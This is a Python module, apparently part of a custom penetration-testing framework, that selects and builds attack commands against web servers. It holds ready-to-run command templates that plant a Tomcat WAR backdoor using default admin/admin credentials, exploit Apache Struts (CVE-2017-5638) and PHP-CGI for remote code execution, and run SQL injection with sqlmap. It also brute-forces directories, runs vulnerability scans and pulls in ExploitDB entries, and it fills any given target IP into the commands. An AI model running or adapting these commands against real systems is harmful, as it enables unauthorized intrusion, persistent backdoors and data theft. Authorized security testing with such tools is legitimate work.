"""
HTTP/HTTPS Exploit Module — Port 80/443
Techniques: Web app scanning, directory brute force, known CVEs
"""
import subprocess

MODULE_INFO = {
    "port": 80,
    "service": "http",
    "name": "HTTP/HTTPS Web Exploit Module",
    "description": "Web application scanning, directory enumeration, known web server CVEs",
    "author": "Custom",
    "mitre": ["T1190", "T1059.007", "T1505.003"],
    "techniques": [
        {"id": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
        {"id": "T1505.003", "name": "Web Shell", "tactic": "Persistence"},
    ],
}

EXPLOITS = [
    {
        "name": "HTTP Version & Header Scan",
        "source": "metasploit",
        "type": "auxiliary",
        "msf_module": "auxiliary/scanner/http/http_version",
        "description": "Identifies web server software, version, and headers for CVE matching",
        "exec_command": "msfconsole -q -x 'use auxiliary/scanner/http/http_version; set RHOSTS {target}; run; exit'",
        "risk": "Info — fingerprinting for vulnerability correlation",
    },
    {
        "name": "Directory Brute Force (Gobuster)",
        "source": "custom",
        "type": "auxiliary",
        "msf_module": "",
        "description": "Discovers hidden directories, admin panels, and backup files",
        "exec_command": "gobuster dir -u http://{target} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -q",
        "risk": "Medium — hidden paths may expose admin interfaces or sensitive data",
    },
    {
        "name": "Nikto Web Vulnerability Scanner",
        "source": "custom",
        "type": "auxiliary",
        "msf_module": "",
        "description": "Comprehensive web server vulnerability scanner checking 6700+ dangerous files",
        "exec_command": "nikto -h http://{target} -Tuning x",
        "risk": "High — identifies misconfigurations, outdated software, and dangerous files",
    },
    {
        "name": "Apache Tomcat Manager Upload",
        "source": "metasploit",
        "type": "exploit",
        "msf_module": "exploit/multi/http/tomcat_mgr_upload",
        "description": "Uploads a WAR file backdoor via the Tomcat Manager application",
        "exec_command": "msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS {target}; set HttpUsername admin; set HttpPassword admin; run; exit'",
        "risk": "Critical — gives remote code execution on the web server",
    },
    {
        "name": "Apache Struts RCE (CVE-2017-5638)",
        "source": "metasploit",
        "type": "exploit",
        "msf_module": "exploit/multi/http/struts2_content_type_ognl",
        "description": "Remote code execution via Content-Type header injection in Apache Struts",
        "exec_command": "msfconsole -q -x 'use exploit/multi/http/struts2_content_type_ognl; set RHOSTS {target}; set TARGETURI /; run; exit'",
        "risk": "Critical — unauthenticated RCE on Struts applications",
    },
    {
        "name": "PHP CGI Argument Injection",
        "source": "metasploit",
        "type": "exploit",
        "msf_module": "exploit/multi/http/php_cgi_arg_injection",
        "description": "Exploits PHP-CGI argument injection for remote code execution (CVE-2012-1823)",
        "exec_command": "msfconsole -q -x 'use exploit/multi/http/php_cgi_arg_injection; set RHOSTS {target}; run; exit'",
        "risk": "Critical — remote code execution on PHP installations",
    },
    {
        "name": "SQLMap SQL Injection",
        "source": "custom",
        "type": "exploit",
        "msf_module": "",
        "description": "Automated SQL injection detection and exploitation",
        "exec_command": "sqlmap -u 'http://{target}/' --crawl=2 --batch --random-agent",
        "risk": "Critical — database access, data extraction, potential OS command execution",
    },
]


def enumerate(target_ip, service_info=None):
    """Find exploits for HTTP/HTTPS service."""
    results = []
    product = (service_info or {}).get("product", "").lower()
    version = (service_info or {}).get("version", "")

    # Always include core web checks
    results.extend(EXPLOITS[:3])  # Version, gobuster, nikto

    # Product-specific
    if "tomcat" in product:
        results.append(EXPLOITS[3])
    if "struts" in product or "apache" in product:
        results.append(EXPLOITS[4])
    if "php" in product:
        results.append(EXPLOITS[5])

    # Always offer sqlmap
    results.append(EXPLOITS[6])

    # Searchsploit
    if product and version:
        try:
            r = subprocess.run(
                ["searchsploit", f"{product} {version}", "--json"],
                capture_output=True, text=True, timeout=8,
            )
            if r.returncode == 0:
                import json
                data = json.loads(r.stdout)
                for ex in data.get("RESULTS_EXPLOIT", [])[:3]:
                    results.append({
                        "name": ex.get("Title", "Unknown"),
                        "source": "searchsploit",
                        "type": "exploit",
                        "msf_module": ex.get("Path", ""),
                        "description": f"ExploitDB: {ex.get('Title', '')}",
                        "exec_command": f"searchsploit -m {ex.get('EDB-ID', '')}",
                        "risk": "Varies",
                    })
        except Exception:
            pass

    return results


def exploit(target_ip, port=80, exploit_info=None):
    if not exploit_info:
        exploit_info = EXPLOITS[0]
    cmd = exploit_info.get("exec_command", "").format(target=target_ip)
    return {"command": cmd, "module": exploit_info.get("msf_module", ""),
            "status": "ready", "target": f"{target_ip}:{port}"}
